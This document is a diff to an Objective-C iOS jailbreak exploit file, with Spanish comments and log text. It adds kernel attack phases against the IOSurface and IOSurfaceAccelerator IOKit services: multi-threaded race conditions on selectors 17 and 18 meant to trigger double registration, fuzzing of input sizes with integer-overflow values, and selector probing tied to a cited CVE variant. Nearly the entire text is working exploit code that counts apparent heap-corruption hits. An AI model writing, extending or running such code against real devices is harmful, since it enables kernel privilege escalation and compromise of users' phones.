@@ -27193,42 +27193,147 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             }
         }
 
-        // === FASE 12: Race condition sel17/sel18 vs IOServiceClose ===
-        log(@"[JB22] ═══ Fase 12: Race condition (200 intentos) ═══");
+        // === FASE 12a: Race sel17 vs sel18 (dos hilos, misma conexión) ===
+        log(@"[JB22] ═══ Fase 12a: Race sel17 vs sel18 (iOS 27 — 500 intentos) ═══");
         if (!isr_stopped()) {
-            typedef kern_return_t (*RawCloseFn)(io_connect_t);
-            RawCloseFn rawClose = (RawCloseFn)dlsym(RTLD_DEFAULT, "IOServiceClose");
-            int raceAnomalies = 0;
-            for (int attempt = 0; attempt < 200 && !isr_stopped(); attempt++) {
+            int raceA_hits = 0;
+            int raceA_success_both = 0;
+            for (int attempt = 0; attempt < 500 && !isr_stopped(); attempt++) {
                 io_connect_t cRace = 0;
                 if (sym.open(svc, mach_task_self(), 0, &cRace) != KERN_SUCCESS) continue;
                 jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
-                __block volatile int closed = 0;
-                io_connect_t cCopy = cRace;
-                RawCloseFn closeCopy = rawClose;
+
+                __block volatile kern_return_t threadResult = 0xDEAD;
+                __block volatile int threadDone = 0;
+                ISR_CallFn callCp = sym.call;
+                io_connect_t cCp = cRace;
                 dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
-                    usleep(arc4random_uniform(30));
-                    closeCopy(cCopy);
-                    closed = 1;
-                });
-                ISR_CallFn callCopy = sym.call;
-                ISR_AsyncCallFn asyncCopy = asyncCall;
-                for (int i = 0; i < 30 && !closed; i++) {
                     uint64_t db[3] = {1, 2, 3};
-                    kern_return_t kr18 = callCopy(cRace, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
-                    kern_return_t kr17 = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCopy, callCopy);
-                    if (kr18 != KERN_SUCCESS && kr18 != (kern_return_t)0xe00002c2
-                        && kr18 != (kern_return_t)0xe00002ed && kr18 != (kern_return_t)0xe00002be) {
-                        raceAnomalies++;
-                        if (raceAnomalies <= 20)
-                            log([NSString stringWithFormat:@"[JB22] ★★ RACE[%d.%d] sel18=0x%x sel17=0x%x",
-                                 attempt, i, kr18, kr17]);
+                    threadResult = callCp(cCp, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
+                    threadDone = 1;
+                });
+                kern_return_t mainR = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
+                while (!threadDone) usleep(10);
+                kern_return_t tR = (kern_return_t)threadResult;
+
+                if (mainR == KERN_SUCCESS && tR == KERN_SUCCESS) {
+                    raceA_success_both++;
+                    if (raceA_success_both <= 5)
+                        log([NSString stringWithFormat:@"[JB22] ★★ 12a[%d] AMBOS OK — re-reg+dereg simultáneo!", attempt]);
+                }
+                if (tR != KERN_SUCCESS && tR != (kern_return_t)0xe00002c2 && tR != (kern_return_t)0x10000003) {
+                    raceA_hits++;
+                    if (raceA_hits <= 10)
+                        log([NSString stringWithFormat:@"[JB22] ★ 12a[%d] sel18=0x%x sel17=0x%x", attempt, tR, mainR]);
+                }
+                sym.close(cRace);
+            }
+            log([NSString stringWithFormat:@"[JB22] 12a: both_ok=%d anomalías=%d /500", raceA_success_both, raceA_hits]);
+            if (raceA_success_both > 0) heapPtrsFound += raceA_success_both;
+        }
+
+        // === FASE 12b: Race sel17 vs sel17 (double-register race) ===
+        log(@"[JB22] ═══ Fase 12b: Race sel17 vs sel17 (500 intentos) ═══");
+        if (!isr_stopped()) {
+            int raceB_double = 0;
+            for (int attempt = 0; attempt < 500 && !isr_stopped(); attempt++) {
+                io_connect_t cRace = 0;
+                if (sym.open(svc, mach_task_self(), 0, &cRace) != KERN_SUCCESS) continue;
+
+                __block volatile kern_return_t threadResult = 0xDEAD;
+                __block volatile int threadDone = 0;
+                ISR_AsyncCallFn asyncCp = asyncCall;
+                ISR_CallFn callCp = sym.call;
+                io_connect_t cCp = cRace;
+                int shapeCp = calibShape;
+                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+                    uint64_t tin[3] = {1, 2, 3};
+                    threadResult = jb20_call_sel(cCp, 17, tin, 24, shapeCp, asyncCp, callCp);
+                    threadDone = 1;
+                });
+                kern_return_t mainR = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
+                while (!threadDone) usleep(10);
+                kern_return_t tR = (kern_return_t)threadResult;
+
+                if (mainR == KERN_SUCCESS && tR == KERN_SUCCESS) {
+                    raceB_double++;
+                    if (raceB_double <= 10)
+                        log([NSString stringWithFormat:@"[JB22] ★★★ 12b[%d] DOUBLE REGISTER — ambos sel17 OK!", attempt]);
+                } else if (tR != KERN_SUCCESS && tR != (kern_return_t)0xe00002c9
+                           && tR != (kern_return_t)0xe00002c2 && tR != (kern_return_t)0x10000003) {
+                    if (raceB_double <= 10)
+                        log([NSString stringWithFormat:@"[JB22] 12b[%d] t=0x%x m=0x%x", attempt, tR, mainR]);
+                }
+                sym.close(cRace);
+            }
+            log([NSString stringWithFormat:@"[JB22] 12b: double_register=%d /500", raceB_double]);
+            if (raceB_double > 0) heapPtrsFound += raceB_double;
+        }
+
+        // === FASE 12c: Input size fuzzing sel17 (integer overflow iOS 27) ===
+        log(@"[JB22] ═══ Fase 12c: Input size fuzzing sel17 ═══");
+        if (!isr_stopped()) {
+            io_connect_t cFuzz = 0;
+            if (sym.open(svc, mach_task_self(), 0, &cFuzz) == KERN_SUCCESS) {
+                size_t sizes[] = {0, 1, 8, 16, 23, 24, 25, 32, 48, 64, 128, 256, 512,
+                                  1024, 4096, 0xFFFF, 0xFFFFFFF0, 0xFFFFFFFF};
+                int nSizes = sizeof(sizes) / sizeof(sizes[0]);
+                for (int i = 0; i < nSizes && !isr_stopped(); i++) {
+                    uint64_t bigBuf[64] = {0};
+                    bigBuf[0] = 1; bigBuf[1] = 2; bigBuf[2] = 3;
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    uint64_t ref = 0xAA;
+                    uint32_t soc = 0;
+                    kern_return_t kr = asyncCall(cFuzz, 17, wp, &ref, 1,
+                                                 NULL, 0, bigBuf, sizes[i], NULL, &soc, NULL, NULL);
+                    mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
+                    if (kr != (kern_return_t)0xe00002c2) {
+                        log([NSString stringWithFormat:@"[JB22] 12c: size=0x%zx → 0x%x %s",
+                             sizes[i], kr, (kr == KERN_SUCCESS) ? "★ OK" : ""]);
+                    }
+                    if (kr == KERN_SUCCESS) {
+                        uint64_t db[3] = {1, 2, 3};
+                        sym.call(cFuzz, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
                     }
                 }
-                while (!closed) usleep(100);
+                sym.close(cFuzz);
             }
-            log([NSString stringWithFormat:@"[JB22] Race anomalías: %d/200", raceAnomalies]);
-            if (raceAnomalies > 0) heapPtrsFound += raceAnomalies;
+        }
+
+        // === FASE 13: IOSurfaceAccelerator probe (iOS 27 — CVE-2026-43655 variante) ===
+        log(@"[JB22] ═══ Fase 13: IOSurfaceAccelerator probe ═══");
+        if (!isr_stopped()) {
+            CFMutableDictionaryRef accMatch = sym.matching("IOSurfaceAccelerator");
+            io_service_t accSvc = 0;
+            if (accMatch) accSvc = sym.getMatch(0, accMatch);
+            if (accSvc) {
+                log(@"[JB22] IOSurfaceAccelerator encontrado!");
+                io_connect_t cAcc = 0;
+                kern_return_t openKr = sym.open(accSvc, mach_task_self(), 0, &cAcc);
+                log([NSString stringWithFormat:@"[JB22] Accelerator open: 0x%x", openKr]);
+                if (openKr == KERN_SUCCESS) {
+                    for (int sel = 0; sel <= 20 && !isr_stopped(); sel++) {
+                        uint64_t inBuf[8] = {0, 1, 2, 3, 4, 5, 6, 7};
+                        uint64_t outScalar[4] = {0};
+                        uint32_t outCnt = 4;
+                        kern_return_t kr = sym.call(cAcc, sel, NULL, 0, inBuf, 64,
+                                                    outScalar, &outCnt, NULL, NULL);
+                        if (kr != (kern_return_t)0xe00002c2) {
+                            log([NSString stringWithFormat:@"[JB22] Accel sel%d → 0x%x out=[0x%llx,0x%llx]",
+                                 sel, kr, outScalar[0], outScalar[1]]);
+                        }
+                        kern_return_t kr2 = jb20_call_sel(cAcc, sel, in3, 24, calibShape, asyncCall, sym.call);
+                        if (kr2 != (kern_return_t)0xe00002c2 && kr2 != kr) {
+                            log([NSString stringWithFormat:@"[JB22] Accel sel%d(async) → 0x%x", sel, kr2]);
+                        }
+                    }
+                    sym.close(cAcc);
+                }
+                sym.release(accSvc);
+            } else {
+                log(@"[JB22] IOSurfaceAccelerator no disponible");
+            }
         }
 
         if (sentinels) {
